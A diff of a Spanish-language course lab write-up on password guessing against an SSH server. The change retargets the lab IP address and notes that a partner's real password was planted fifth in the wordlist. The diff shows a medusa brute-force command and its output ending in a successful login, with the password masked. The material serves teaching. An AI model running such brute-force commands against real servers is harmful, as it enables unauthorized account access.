@@ -1862,18 +1862,18 @@ Realice algún ataque de “password guessing” contra su servidor ssh y compru
 Diccionario [aquí](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials).
 
 ```bash
-root@debian:/home/lsi# medusa -h 10.11.48.50 -u lsi -P 10k-most-common.txt -M ssh
+root@debian:/home/lsi# medusa -h 10.11.49.106 -u lsi -P 10k-most-common.txt -M ssh
 Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
 
-ACCOUNT CHECK: [ssh] Host: 10.11.48.50 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: password (1 of 10001 complete)
-ACCOUNT CHECK: [ssh] Host: 10.11.48.50 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 123456 (2 of 10001 complete)
-ACCOUNT CHECK: [ssh] Host: 10.11.48.50 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 12345678 (3 of 10001 complete)
-ACCOUNT CHECK: [ssh] Host: 10.11.48.50 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 1234 (4 of 10001 complete)
-ACCOUNT CHECK: [ssh] Host: 10.11.48.50 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: XXXXXXXXX (5 of 10001 complete)
-ACCOUNT FOUND: [ssh] Host: 10.11.48.50 User: lsi Password: XXXXXXXXX [SUCCESS]
+ACCOUNT CHECK: [ssh] Host: 10.11.49.106 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: password (1 of 10001 complete)
+ACCOUNT CHECK: [ssh] Host: 10.11.49.106 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 123456 (2 of 10001 complete)
+ACCOUNT CHECK: [ssh] Host: 10.11.49.106 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 12345678 (3 of 10001 complete)
+ACCOUNT CHECK: [ssh] Host: 10.11.49.106 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: 1234 (4 of 10001 complete)
+ACCOUNT CHECK: [ssh] Host: 10.11.49.106 (1 of 1, 0 complete) User: lsi (1 of 1, 0 complete) Password: XXXXXXXXX (5 of 10001 complete)
+ACCOUNT FOUND: [ssh] Host: 10.11.49.106 User: lsi Password: XXXXXXXXX [SUCCESS]
 ```
 
-> Al diccionario le añadí la password real del usuario lsi manualmente en la quinta posición.
+> Al diccionario le añadí la password real del usuario lsi de mi compañero manualmente en la quinta posición.
 
 ### Apartado R
 
